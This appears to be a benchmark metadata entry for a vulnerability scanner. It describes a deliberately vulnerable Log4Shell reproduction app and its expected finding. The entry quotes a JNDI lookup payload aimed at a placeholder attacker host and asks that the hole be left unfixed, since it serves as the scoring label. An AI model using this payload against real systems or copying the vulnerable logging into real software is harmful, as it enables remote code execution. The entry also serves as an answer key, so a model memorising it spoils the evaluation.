$provenance: Vendored in full (2 Java files) from https://github.com/christophetd/log4shell-vulnerable-app (MIT license, 1.1k stars — the reference minimal reproduction used industry-wide during the December 2021 Log4Shell disclosure) at pinned commit c962aabb31a6af0a77f0e9bbc7100e175c7c04e (2022-12-14). `build.gradle` pins `org.springframework.boot:spring-boot-starter-log4j2:2.6.1`, whose managed BOM (verified against the published Maven POM at https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.1/spring-boot-dependencies-2.6.1.pom) resolves `log4j2.version` to `2.14.1` — inside the CVE-2021-44228 (Log4Shell) vulnerable range (all versions < 2.15.0). Do not "fix" this — it is the label the precision/recall gate scores against.

expectedFindings.description: `logger.info("..." + apiVersion)` logs the attacker-controlled `X-Api-Version` request header through Log4j2 2.14.1 (pinned via `spring-boot-starter-log4j2:2.6.1`'s managed BOM) — CVE-2021-44228 (Log4Shell): a `${jndi:ldap://attacker/a}` header value triggers a JNDI lookup and remote class load, i.e. unauthenticated RCE. Fix is an auto-eligible dependency bump to log4j-core >= 2.17.1 (or >= 2.15.0 for the base CVE).
